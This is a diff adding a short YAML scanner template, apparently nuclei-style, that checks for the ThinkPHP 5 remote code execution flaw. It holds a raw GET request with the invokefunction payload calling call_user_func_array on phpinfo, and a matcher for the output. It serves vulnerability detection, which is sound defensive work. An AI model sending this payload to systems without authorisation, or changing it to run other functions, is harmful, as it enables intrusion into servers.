@@ -1,0 +1,9 @@
+name: thinkphp5-rce
+request:
+  raw: |
+    GET {{BaseURL}}/index.php?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1 HTTP/1.1
+
+
+matcher:
+  type: word
+  words: ["phpinfo()"]
